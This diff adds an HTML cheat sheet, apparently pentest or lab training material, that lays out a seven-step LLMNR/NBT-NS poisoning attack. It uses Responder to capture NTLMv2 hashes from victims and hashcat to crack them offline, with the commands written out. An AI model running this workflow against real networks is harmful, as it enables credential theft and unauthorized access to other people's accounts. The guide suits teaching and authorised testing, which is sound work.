@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>LLMNR Poisoning - Responder cheat sheet</title>
+<style>
+  body{font-family:Arial,Helvetica,sans-serif;max-width:1180px;margin:36px auto;padding:0 22px;color:#2c2c2a;line-height:1.6}
+  h1{font-size:22px;font-weight:500;margin-bottom:4px}
+  .intro{color:#5f5e5a;margin-top:0}
+  .layout{display:flex;gap:36px;align-items:flex-start;flex-wrap:wrap;margin-top:20px}
+  .diagram{flex:1 1 360px;min-width:300px;position:sticky;top:20px}
+  .steps{flex:1 1 440px;min-width:320px}
+  .step{margin-top:4px;margin-bottom:24px;page-break-inside:avoid}
+  .step .label{font-weight:500;font-size:16px}
+  .step p{margin:6px 0}
+  pre{background:#f1efe8;border:1px solid #d3d1c7;border-radius:6px;padding:10px 12px;overflow-x:auto;font-size:13px;line-height:1.5}
+  svg{display:block;max-width:100%;height:auto}
+  .key{margin-top:28px;color:#5f5e5a;border-top:1px solid #d3d1c7;padding-top:14px}
+</style>
+</head>
+<body>
+
+<h1>LLMNR Poisoning - Responder cheat sheet</h1>
+<p class="intro">A general LLMNR/NBT-NS poisoning workflow with Responder to capture NTLMv2 hashes. Replace the placeholders (&lt;...&gt;) with your own values.</p>
+
+<div class="layout">
+
+<div class="diagram">
+<svg xmlns="http://www.w3.org/2000/svg" width="680" height="660" viewBox="0 0 680 660" role="img">
+<title>LLMNR Poisoning attack steps</title>
+<desc>Victim broadcasts an LLMNR query, Kali intercepts it with Responder and captures the NTLMv2 hash.</desc>
+<style>
+  text{font-family:Arial,Helvetica,sans-serif}
+  .th{font-size:14px;font-weight:500}
+  .ts{font-size:12px}
+  .gray .box{fill:#F1EFE8;stroke:#5F5E5A;stroke-width:.5}
+  .gray .th{fill:#444441}
+  .gray .ts{fill:#5F5E5A}
+  .coral .box{fill:#FAECE7;stroke:#993C1D;stroke-width:.5}
+  .coral .th{fill:#712B13}
+  .coral .ts{fill:#993C1D}
+  .blue .box{fill:#E6F1FB;stroke:#185FA5;stroke-width:.5}
+  .blue .th{fill:#0C447C}
+  .blue .ts{fill:#185FA5}
+  .green .box{fill:#E8F5E9;stroke:#2E7D32;stroke-width:.5}
+  .green .th{fill:#1B5E20}
+  .green .ts{fill:#2E7D32}
+  .arrow{stroke:#888780;stroke-width:1.5;fill:none}
+</style>
+<defs>
+  <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 1L8 5L2 9" fill="none" stroke="#888780" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+  <marker id="arrow-red" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+    <path d="M2 1L8 5L2 9" fill="none" stroke="#993C1D" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+  </marker>
+</defs>
+
+<!-- Network nodes -->
+<g class="blue"><rect class="box" x="40" y="40" width="140" height="54" rx="4"/>
+  <text class="th" x="110" y="63" text-anchor="middle">Victim</text>
+  <text class="ts" x="110" y="81" text-anchor="middle">Windows client</text>
+</g>
+<g class="coral"><rect class="box" x="260" y="40" width="140" height="54" rx="4"/>
+  <text class="th" x="330" y="63" text-anchor="middle">Kali</text>
+  <text class="ts" x="330" y="81" text-anchor="middle">Responder running</text>
+</g>
+<g class="gray"><rect class="box" x="480" y="40" width="140" height="54" rx="4"/>
+  <text class="th" x="550" y="63" text-anchor="middle">DNS server</text>
+  <text class="ts" x="550" y="81" text-anchor="middle">real resolver</text>
+</g>
+
+<!-- Broadcast arrow: victim → subnet (wide dashed) -->
+<line stroke="#185FA5" stroke-width="1.5" stroke-dasharray="5,3" x1="182" y1="67" x2="258" y2="67" marker-end="url(#arrow)"/>
+<text font-family="Arial" font-size="11" fill="#185FA5" x="196" y="60" text-anchor="middle">LLMNR</text>
+<text font-family="Arial" font-size="11" fill="#185FA5" x="196" y="50" text-anchor="middle">broadcast</text>
+
+<!-- DNS fails arrow -->
+<line stroke="#888780" stroke-width="1.5" stroke-dasharray="5,3" x1="402" y1="67" x2="478" y2="67" marker-end="url(#arrow)"/>
+<text font-family="Arial" font-size="11" fill="#888780" x="440" y="58" text-anchor="middle">DNS fails</text>
+
+<!-- Responder fake reply -->
+<path stroke="#993C1D" stroke-width="1.5" fill="none" d="M 330 96 Q 220 130 182 96" marker-end="url(#arrow-red)"/>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="235" y="128" text-anchor="middle">fake reply: "I'm here"</text>
+
+<!-- NTLMv2 hash arrow -->
+<line stroke="#993C1D" stroke-width="1.5" x1="182" y1="80" x2="258" y2="80" marker-end="url(#arrow-red)"/>
+<text font-family="Arial" font-size="11" fill="#993C1D" x="220" y="96" text-anchor="middle">NTLMv2 hash</text>
+
+<!-- Step boxes -->
+<g class="gray"><rect class="box" x="140" y="170" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="190" text-anchor="middle">1. Prep network</text>
+  <text class="ts" x="330" y="207" text-anchor="middle">confirm interface and lab IP</text>
+</g>
+<line class="arrow" x1="330" y1="217" x2="330" y2="232" marker-end="url(#arrow)"/>
+
+<g class="gray"><rect class="box" x="140" y="234" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="254" text-anchor="middle">2. Launch Responder</text>
+  <text class="ts" x="330" y="271" text-anchor="middle">sudo responder -I &lt;iface&gt; -wv</text>
+</g>
+<line class="arrow" x1="330" y1="281" x2="330" y2="296" marker-end="url(#arrow)"/>
+
+<g class="gray"><rect class="box" x="140" y="298" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="318" text-anchor="middle">3. Wait for LLMNR broadcast</text>
+  <text class="ts" x="330" y="335" text-anchor="middle">victim queries a non-existent hostname</text>
+</g>
+<line class="arrow" x1="330" y1="345" x2="330" y2="360" marker-end="url(#arrow)"/>
+
+<g class="coral"><rect class="box" x="140" y="362" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="382" text-anchor="middle">4. Capture NTLMv2 hash</text>
+  <text class="ts" x="330" y="399" text-anchor="middle">printed to terminal + saved to logs/</text>
+</g>
+<line class="arrow" x1="330" y1="409" x2="330" y2="424" marker-end="url(#arrow)"/>
+
+<g class="green"><rect class="box" x="140" y="426" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="446" text-anchor="middle">5. Crack hash offline</text>
+  <text class="ts" x="330" y="463" text-anchor="middle">hashcat -m 5600 hash.txt wordlist.txt</text>
+</g>
+<line class="arrow" x1="330" y1="473" x2="330" y2="488" marker-end="url(#arrow)"/>
+
+<g class="gray"><rect class="box" x="140" y="490" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="510" text-anchor="middle">6. Stop Responder</text>
+  <text class="ts" x="330" y="527" text-anchor="middle">Ctrl+C — no ARP tables to restore</text>
+</g>
+<line class="arrow" x1="330" y1="537" x2="330" y2="552" marker-end="url(#arrow)"/>
+
+<g class="gray"><rect class="box" x="140" y="554" width="380" height="46" rx="4"/>
+  <text class="th" x="330" y="574" text-anchor="middle">7. Restore network (if changed)</text>
+  <text class="ts" x="330" y="591" text-anchor="middle">switch back to DHCP</text>
+</g>
+</svg>
+</div>
+
+<div class="steps">
+
+<div class="step"><span class="label">Step 1 - Prep Kali's network</span>
+<p>Make sure Kali is on the same subnet as your targets. Confirm the right interface and IP:</p>
+<pre>ip -4 addr show
+sudo nmcli con mod "&lt;connection name&gt;" ipv4.method manual ipv4.addresses &lt;kali-ip&gt;/24
+sudo nmcli con up "&lt;connection name&gt;"</pre>
+</div>
+
+<div class="step"><span class="label">Step 2 - Launch Responder</span>
+<pre>sudo responder -I &lt;interface&gt;</pre>
+<p>Common flags:<br>
+&nbsp;&nbsp;<code>-I</code> &nbsp;interface to listen on (e.g. eth0)</p>
+</div>
+
+<div class="step"><span class="label">Step 3 - Trigger the poisoning</span>
+<p>Wait for a victim to broadcast an LLMNR or NBT-NS query. This happens automatically when a user or process tries to reach a hostname that does not exist in DNS (e.g. a mistyped share like <code>\\fileserv</code>). Responder intercepts the broadcast and replies with Kali's IP, causing the victim to authenticate against Kali.</p>
+</div>
+
+<div class="step"><span class="label">Step 4 - Capture the NTLMv2 hash</span>
+<p>Responder prints captured hashes to the terminal and saves them to:</p>
+<pre>/usr/share/responder/logs/</pre>
+<p>Look for a file like <code>SMB-NTLMv2-SSP-&lt;victim-ip&gt;.txt</code>. Each hash looks like:</p>
+<pre>&lt;username&gt;::&lt;domain&gt;:&lt;challenge&gt;:&lt;response&gt;:&lt;NTLMv2 blob&gt;</pre>
+</div>
+
+<div class="step"><span class="label">Step 5 - Crack the hash offline</span>
+<p>Use hashcat with mode 5600 (NTLMv2):</p>
+<pre>hashcat -m 5600 &lt;hash-file&gt; &lt;wordlist&gt; --force
+
+# Example with rockyou:
+hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-&lt;victim-ip&gt;.txt \
+        /usr/share/wordlists/rockyou.txt --force</pre>
+</div>
+
+<div class="step"><span class="label">Step 6 - Stop Responder</span>
+<p>Press <code>Ctrl+C</code> in the terminal. Responder does not modify ARP tables, so no network cleanup is needed.</p>
+</div>
+
+<div class="step"><span class="label">Step 7 - Restore Kali's normal networking (if changed in Step 1)</span>
+<pre>sudo nmcli con mod "&lt;connection name&gt;" ipv4.method auto
+sudo nmcli con up "&lt;connection name&gt;"</pre>
+</div>
+
+</div>
+</div>
+
+<p class="key">Key idea: LLMNR and NBT-NS are fallback name-resolution protocols that broadcast to the whole subnet when DNS fails. Responder answers those broadcasts and tricks victims into handing over their NTLMv2 hashes — which can then be cracked offline or used in relay attacks.</p>
+
+</body>
+</html>
